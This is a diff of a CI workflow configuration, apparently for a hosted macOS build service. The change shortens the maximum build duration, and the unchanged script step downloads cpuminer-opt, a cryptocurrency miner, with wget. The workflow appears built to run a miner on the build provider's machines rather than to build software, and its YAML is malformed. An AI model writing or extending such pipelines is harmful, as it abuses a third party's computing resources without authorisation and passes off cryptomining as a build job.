@@ -2,7 +2,7 @@ workflows:
   my-workflow:
     name: Guin
     instance_type: mac_pro
-    max_build_duration: 1200
+    max_build_duration: 120
     scripts:
          name tesy
              - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz
